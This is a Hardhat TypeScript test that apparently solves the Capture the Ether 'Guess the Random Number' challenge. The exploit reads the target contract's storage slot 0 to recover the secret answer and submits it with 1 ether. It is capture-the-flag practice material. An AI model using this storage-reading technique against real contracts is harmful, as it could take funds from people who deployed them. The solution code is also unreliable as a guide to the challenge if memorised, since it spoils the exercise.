import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers"
import { GuessTheRandomNumberChallenge } from "../typechain-types"
import { assert, expect } from "chai"
import { ethers } from "hardhat"

describe("Guess Secret Number challenge", function () {
    let attacker: SignerWithAddress
    let target: GuessTheRandomNumberChallenge
    before(async function () {
        // Setup code here
        let instanceAddress: string =
            "0x7f7243d3bCeE75ebbeFB5884C88Ea7C13115AE19"
        ;[attacker] = await ethers.getSigners()
        target = await ethers.getContractAt(
            "GuessTheRandomNumberChallenge",
            instanceAddress,
            attacker
        )
    })

    it("Guesses the secret number", async function () {
        // Exploit code here
        let secret = await ethers.provider.getStorageAt(target.address, 0)
        console.log("Secret:", secret.toString())

        let tx = await target.guess(secret.toString(), {
            value: ethers.utils.parseEther("1"),
        })
        await tx.wait()
    })

    after(async function () {
        // Verification Code here
        assert(await target.isComplete(), "Challenge not completed")
    })
})
